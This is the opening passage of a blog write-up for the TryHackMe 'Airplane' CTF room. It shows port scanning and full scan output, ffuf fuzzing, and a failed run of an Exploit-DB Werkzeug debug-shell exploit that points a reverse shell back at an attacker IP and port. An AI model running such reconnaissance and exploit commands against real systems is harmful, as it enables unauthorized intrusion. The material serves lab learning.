<!doctype html><html lang=en dir=ltr><head><title>Airplane | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Introduction Detailed walkthroughs for Airplane CTF challenges on TryHackMe .
Tools Used rustscan, ffuf, nessus, curl, nc, gdb, ssh-keygen, ssh
Enumeration Lets start the process by mapping host-name to target IP address.
sudo echo &amp;#34;10.10.249.133 airplane.thm&amp;#34; &amp;gt;&amp;gt; /etc/hosts Rustscan Let&amp;rsquo;s start enumaration process using rustscan portscanner.
$ rustscan -a airplane.thm -- -sC -sV Open 10.10.249.133:22 Open 10.10.249.133:6048 Open 10.10.249.133:8000 [~] Starting Script(s) [&amp;gt;] Running script &amp;#34;nmap -vvv -p {{port}} {{ip}} -sC -sV&amp;#34; on ip 10."><meta name=keywords content="cyber security,penetration testing,ethical hacking,vulnerability assessment,network security,application security,web application security,security testing,red teaming,bug bounty,CTFs,cybersecurity challenges,hacking tutorials,security tools,exploit development,reverse engineering,penetration tester,security researcher,security analyst,information security,digital forensics,incident response,threat intelligence,security awareness,social engineering,phishing,malware analysis,cryptography,cloud security,IoT security,mobile security,how to become a penetration tester,penetration testing tools,CTF challenges for beginners,web application penetration testing,network penetration testing,exploit development tutorial,reverse engineering techniques,bug bounty hunting tips,security research projects,cyber security certifications"><meta name=robots content="noodp"><link rel=manifest href=/manifest.json><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/airplane/writeup/"><meta property="og:site_name" content="CyberJagadeesh"><meta property="og:title" content="Airplane | THM Writeup"><meta property="og:description" content='Introduction Detailed walkthroughs for Airplane CTF challenges on TryHackMe .
Tools Used rustscan, ffuf, nessus, curl, nc, gdb, ssh-keygen, ssh
Enumeration Lets start the process by mapping host-name to target IP address.
sudo echo "10.10.249.133 airplane.thm" >> /etc/hosts Rustscan Let’s start enumaration process using rustscan portscanner.
$ rustscan -a airplane.thm -- -sC -sV Open 10.10.249.133:22 Open 10.10.249.133:6048 Open 10.10.249.133:8000 [~] Starting Script(s) [>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-11T19:39:14+05:30"><meta property="article:modified_time" content="2024-08-11T19:39:14+05:30"><meta property="article:tag" content="Ffuf"><meta property="article:tag" content="Nessus"><meta property="article:tag" content="Lfi"><meta property="article:tag" content="/Proc"><meta property="article:tag" content="Gdbserver"><meta property="article:tag" content="Msfvenom"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/block/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/pyrat/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/"><meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/chrome/writeup/"><meta name=twitter:card content="summary"><meta name=twitter:title content="Airplane | THM Writeup"><meta name=twitter:description content='Introduction Detailed walkthroughs for Airplane CTF challenges on TryHackMe .
Tools Used rustscan, ffuf, nessus, curl, nc, gdb, ssh-keygen, ssh
Enumeration Lets start the process by mapping host-name to target IP address.
sudo echo "10.10.249.133 airplane.thm" >> /etc/hosts Rustscan Let’s start enumaration process using rustscan portscanner.
$ rustscan -a airplane.thm -- -sC -sV Open 10.10.249.133:22 Open 10.10.249.133:6048 Open 10.10.249.133:8000 [~] Starting Script(s) [>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.'><link rel=canonical href=https://cyberjagadeesh.github.io/posts/airplane/writeup/><link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-376DY6PW0W")}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-08-11T19:39:14+05:30","datePublished":"2024-08-11T19:39:14+05:30","description":"Introduction Detailed walkthroughs for Airplane CTF challenges on TryHackMe .\nTools Used rustscan, ffuf, nessus, curl, nc, gdb, ssh-keygen, ssh\nEnumeration Lets start the process by mapping host-name to target IP address.\nsudo echo \u0026#34;10.10.249.133 airplane.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Rustscan Let\u0026rsquo;s start enumaration process using rustscan portscanner.\n$ rustscan -a airplane.thm -- -sC -sV Open 10.10.249.133:22 Open 10.10.249.133:6048 Open 10.10.249.133:8000 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sC -sV\u0026#34; on ip 10.","image":"/posts/airplane/airplane.png","name":"Airplane | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/airplane/writeup/"}</script></head><body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10"><div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3"><div class="flex-none ml-2 md:ml-0"><a href=/><img class="h-12 w-12 rounded-full object-cover bg-gray-100" src=/logo.png alt=logo></a></div><div class=flex-1></div><div class=flex-none><nav class="h-full static"><button id=navbar-menu-toggle type=button class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls=navbar-menu aria-expanded=false>
<span class=sr-only>Open main menu</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 6h16"/><path d="M4 12h16"/><path d="M4 18h16"/></svg></i></button><div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id=navbar-menu><ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5"><li id=about><a class="block px-3 py-3 hover:text-emerald-600" href=/about/ title=About>About</a></li><li id=post><a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600" href=/posts/ title=Post>Post</a></li></ul></div></nav></div><div class="flex-none mx-1"></div><div class="flex-none md:hidden"><a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls=navbar-menu aria-expanded=false><span class=sr-only>Search</span>
<i class="w-8 h-8"><svg class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1014 0A7 7 0 103 10"/><path d="M21 21l-6-6"/></svg></i></a></div><div class="darkmode-toggle flex flex-none mr-2 md:mr-0"><label for=darkmode-toggle class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode"><input name=darkmode-toggle id=darkmode-toggle type=checkbox class="sr-only peer" aria-label="Toggle dark mode"><div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700"><i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible"><svg class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-3 0a3 3 0 106 0 3 3 0 10-6 0"/><path d="M12 5v.01"/><path d="M17 7v.01"/><path d="M19 12v.01"/><path d="M17 17v.01"/><path d="M12 19v.01"/><path d="M7 17v.01"/><path d="M5 12v.01"/><path d="M7 7v.01"/></svg>
</i><i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible"><svg class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 3c.132.0.263.0.393.0a7.5 7.5.0 007.92 12.446A9 9 0 1112 2.992z"/><path d="M17 4a2 2 0 002 2 2 2 0 00-2 2 2 2 0 00-2-2 2 2 0 002-2"/><path d="M19 11h2m-1-1v2"/></svg></i></div></label></div></div></header><main class="flex flex-auto justify-center"><div class="w-full max-w-4xl lg:max-w-5xl"><div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700"><div><a href=/posts/airplane/writeup/><figure><img class="w-full object-cover h-36 md:h-48 xl:h-60" src=/posts/airplane/airplane.png alt="Airplane | THM Writeup" title="Airplane | THM Writeup" loading=lazy></figure></a></div><div class="flex flex-col gap-y-3 p-6"><h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100"><a href=/posts/airplane/writeup/>Airplane | THM Writeup</a></h1><ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300"><li><a href=/categories/ctf/ class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">CTF</a></li><li><a href=/tags/ffuf/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Ffuf</span></a></li><li><a href=/tags/nessus/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Nessus</span></a></li><li><a href=/tags/lfi/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Lfi</span></a></li><li><a href=/tags/proc/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>/Proc</span></a></li><li><a href=/tags/gdbserver/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Gdbserver</span></a></li><li><a href=/tags/msfvenom/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Msfvenom</span></a></li><li><a href=/tags/bettershell/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>BetterShell</span></a></li><li><a href=/tags/suid/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>SUID</span></a></li><li><a href=/tags/ssh-keygen/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Ssh-Keygen</span></a></li><li><a href=/series/tryhackme/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Tryhackme</span></a></li><li><a href=/platforms/linux/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Linux</span></a></li><li><a href=/levels/medium/ class="flex flex-row text-sm mr-2 py-1"><i class="h-5 w-5 flex-none"><svg class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9h14"/><path d="M5 15h14"/><path d="M11 4 7 20"/><path d="M17 4l-4 16"/></svg>
</i><span class=ml-0>Medium</span></a></li></ul><div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300"><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 7a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V7z"/><path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/><path d="M11 15h1"/><path d="M12 15v3"/></svg>
</i><time datetime=2024-08-11T19:39:14+05:30>2024-08-11</time></div><div class="flex flex-row text-base gap-x-1"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-hourglass-high" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6.5 7h11"/><path d="M6 20v-2a6 6 0 1112 0v2a1 1 0 01-1 1H7a1 1 0 01-1-1z"/><path d="M6 4v2a6 6 0 1012 0V4a1 1 0 00-1-1H7A1 1 0 006 4z"/></svg>
</i><span>6 minutes to read</span></div></div><section class="prose prose-slate dark:prose-invert w-full max-w-4xl lg:max-w-5xl mt-6"><h2>Table of Contents</h2><aside><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a><ul><li><a href=#tools-used>Tools Used</a></li></ul></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#rustscan>Rustscan</a></li><li><a href=#nessus>Nessus</a></li><li><a href=#proc>/proc/</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#lateral-movement>Lateral Movement</a></li></ul></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></aside></section><article class="mt-6 w-full max-w-4xl lg:max-w-5xl prose prose-slate dark:prose-invert prose-quoteless post-content"><h2 id=introduction>Introduction</h2><p>Detailed walkthroughs for <a href=https://tryhackme.com/r/room/airplane target=_blank rel=noopener>Airplane</a>
CTF challenges on <a href=https://tryhackme.com target=_blank rel=noopener>TryHackMe</a>
.</p><h3 id=tools-used>Tools Used</h3><p>rustscan, ffuf, nessus, curl, nc, gdb, ssh-keygen, ssh</p><h2 id=enumeration>Enumeration</h2><p>Lets start the process by mapping host-name to target IP address.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo <span class=nb>echo</span> <span class=s2>&#34;10.10.249.133 airplane.thm&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h3 id=rustscan>Rustscan</h3><p>Let&rsquo;s start enumaration process using rustscan portscanner.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ rustscan -a airplane.thm -- -sC -sV
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Open 10.10.249.133:22
</span></span><span class=line><span class=cl>Open 10.10.249.133:6048
</span></span><span class=line><span class=cl>Open 10.10.249.133:8000
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>~<span class=o>]</span> Starting Script<span class=o>(</span>s<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>&gt;<span class=o>]</span> Running script <span class=s2>&#34;nmap -vvv -p {{port}} {{ip}} -sC -sV&#34;</span> on ip 10.10.249.133
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE  REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh      syn-ack ttl <span class=m>60</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> b8:64:f7:a9:df:29:3a:b5:8a:58:ff:84:7c:1f:1a:b7 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuy7X5e34bStIhDkjJIcUT3kqFt9fHoI/q8AaCCH6HqgOz2HC5GdcDiBN8W6JMoRIIDJO/9FHiFE+MNtESwOP9J+S348GOhUIsVhDux7caJiyJQElrKxXJgxA7DNUvVJNBUchhgGhFv/qCNbUYF8+uaTYc0o/HtvgVw+t/bxS6EO+OlAOpyAjUP5XZjGTyc4n4uCc8mYW6aQHXZR0t5lMaKkNJzXl5+kHxxxnKci6+Ao8vrlKshgIq25NErSqoeTs/wgBcPMkr5r++emLH+rDwmjrTvwrHb2/bKKUenvnbf9AZXbcN52nGthVi95kP6HaDGijXULjrRt2GCul99OmNhEQxJNtLmUnxpxA9ZhBEzMYe3z5EeIbLuA+E9yFSrR6nq2pagC2/qvVMJSAzD749AbwjtbcL8MOf+7DCT+SATY9VxBqtKep/9PDolKi5+prGH6gzfjCkj5YaFS2CvJeGlF/B1XBzd1ccm43Lc4Ad/F4kvQWwkHmpL38kDy4eWCE<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> ad:61:3e:c7:10:32:aa:f1:f2:28:e2:de:cf:84:de:f0 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLYVoN15q7ky/IIo3VNrL35GRCpppImVs7x+PPFRlqO+VcfQ8C+MR2zVEFS0wosQWQFXaCZiInQhWz9swfKN6J8<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> a9:d8:49:aa:ee:de:c4:48:32:e4:f1:9e:2a:8a:67:f0 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIB0hj2IqNazZojgwv0jJr+ZnOF1RCzykZ7W3jKsuCb
</span></span><span class=line><span class=cl>6048/tcp open  x11?     syn-ack ttl <span class=m>60</span>
</span></span><span class=line><span class=cl>8000/tcp open  http-alt syn-ack ttl <span class=m>60</span> Werkzeug/3.0.2 Python/3.8.10
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://airplane.thm:8000/?page<span class=o>=</span>index.html
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: OPTIONS HEAD GET
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Werkzeug/3.0.2 Python/3.8.10
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>404</span> NOT FOUND
</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Werkzeug/3.0.2 Python/3.8.10
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>04</span> Aug <span class=m>2024</span> 12:42:27 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>207</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html <span class=nv>lang</span><span class=o>=</span>en&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;404 Not Found&lt;/title&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Not Found&lt;/h1&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>302</span> FOUND
</span></span><span class=line><span class=cl><span class=p>|</span>     Server: Werkzeug/3.0.2 Python/3.8.10
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Sun, <span class=m>04</span> Aug <span class=m>2024</span> 12:42:21 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>269</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     Location: http://airplane.thm:8000/?page<span class=o>=</span>index.html
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!doctype html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html <span class=nv>lang</span><span class=o>=</span>en&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;Redirecting...&lt;/title&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Redirecting...&lt;/h1&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;http://airplane.thm:8000/?page=index.html&#34;</span>&gt;http://airplane.thm:8000/?page<span class=o>=</span>index.html&lt;/a&gt;. If not, click the link.
</span></span><span class=line><span class=cl><span class=p>|</span>   Socks5: 
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;!DOCTYPE HTML PUBLIC <span class=s2>&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=s2>&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;html&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;head&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;meta http-equiv<span class=o>=</span><span class=s2>&#34;Content-Type&#34;</span> <span class=nv>content</span><span class=o>=</span><span class=s2>&#34;text/html;charset=utf-8&#34;</span>&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/head&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;body&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;Message: Bad request syntax <span class=o>(</span><span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>|     &#39;</span><span class=o>)</span>.&lt;/p&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>     &lt;/body&gt;
</span></span><span class=line><span class=cl><span class=p>|</span>_    &lt;/html&gt;
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><pre><code>    ** Info **
    port    service
    22      ssh
    6048    unknown
    8000    web application
    OS :  Linux
</code></pre><p>Here <strong>port 8000 is interesting</strong>.</p><p><figure><img src=/posts/airplane/4.png title="Airplane: Home page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Airplane: Home page</strong></figcaption></figure>This is a website with simple blog about the airplanes. <a href=http://airplane.thm:8000 target=_blank rel=noopener><code>airplane.thm:8000</code></a>
redirects to <a href="http://airplane.thm:8000/?page=index.html" target=_blank rel=noopener><code>airplane.thm:8000/?page=index.html</code></a></p><p>A simple web search give us the vulnerability information about the version <strong>Werkzeug/3.0.2 Python/3.8.10</strong>.<figure><img src=/posts/airplane/1.png title="Google Search: Werkzeug/3.0.2" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Google Search: Werkzeug/3.0.2</strong></figcaption></figure></p><p>Lets try to exploit it using <a href=https://www.exploit-db.com/exploits/43905 target=_blank rel=noopener>Werkzeug - &lsquo;Debug Shell&rsquo; Command Execution</a>
.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python2 exploit.py airplane.thm <span class=m>8000</span> 10.10.10.1 <span class=m>1234</span>                   
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Debug is not enabled
</span></span></code></pre></div><p>When used exploitdb result to make <strong>Debug Shell Command Execution</strong>, it failed. Lets proceed to next step.</p><p>Lets fuzz the fles/directories</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ffuf -c -u http://airplane.thm:8000/FUZZ -w /usr/share/wordlists/dirb/big.txt
</span></span><span class=line><span class=cl>airplane                <span class=o>[</span>Status: 200, Size: 655, Words: 33, Lines: 36, Duration: 171ms<span class=o>]</span>
</span></span></code></pre></div><p><a href=http://airplane.thm:8000/airplane target=_blank rel=noopener>airplane.thm:8000/airplane</a>
is just a simple animation, not useful.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u http://airplane.thm:8000/  -H <span class=s2>&#34;HOST: FUZZ.airplane.thm&#34;</span> -w /usr/share/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt --mc <span class=m>200</span>
